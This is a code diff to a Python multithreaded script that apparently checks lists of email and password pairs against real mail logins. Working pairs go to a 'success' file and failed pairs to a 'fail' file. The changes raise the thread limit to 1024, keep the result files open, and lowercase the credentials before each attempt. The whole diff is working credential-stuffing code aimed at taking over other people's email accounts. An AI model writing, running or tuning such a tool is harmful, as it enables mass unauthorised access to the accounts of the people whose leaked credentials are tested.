@@ -7,12 +7,19 @@ import time
 import email_login as el
 
 writelock = threading.Lock()
-maxThread = 700  
+maxThread = 1024  
 emailLogin = el.EmailLogin()
 sleeptime = 60
 
 
+def printt():
+    print(1111)
+
 class scanner(threading.Thread):
+
+    success = open("success", "a+")
+    fail = open("fail", "a+")
+    ignore = open("ignore", "a+")
 
     def __init__(self, email, password):
         super().__init__()
@@ -21,19 +28,20 @@ class scanner(threading.Thread):
 
     def writeToFile(self, result):
         with writelock:
-            with open(result, "a+") as f:
-                f.write(self.email + ' ' + self.password + '\n')
+            f = getattr(self, result)
+            f.write(self.email + ' ' + self.password + '\n')
+            f.flush()
 
     def run(self):
         try:
             if emailLogin.login(self.email, self.password):
                 print("Success")
-                result = 'Success'
+                result = 'success'
             else:
                 print("Fail")
-                result = 'Fail'
+                result = 'fail'
         except el.emailDomainNotFind as e:
-            result = 'Ignore'
+            result = 'ignore'
             logging.error(e.msg)
         except el.emailFormatError:
             return
@@ -58,7 +66,7 @@ if __name__ == '__main__':
 
                 while threading.active_count() > maxThread:
                     time.sleep(sleeptime/10)
-                scanner(email.strip(), password.strip()).start()
+                scanner(email.strip().lower(), password.strip().lower()).start()
 
 #    time.sleep(sleeptime)
 
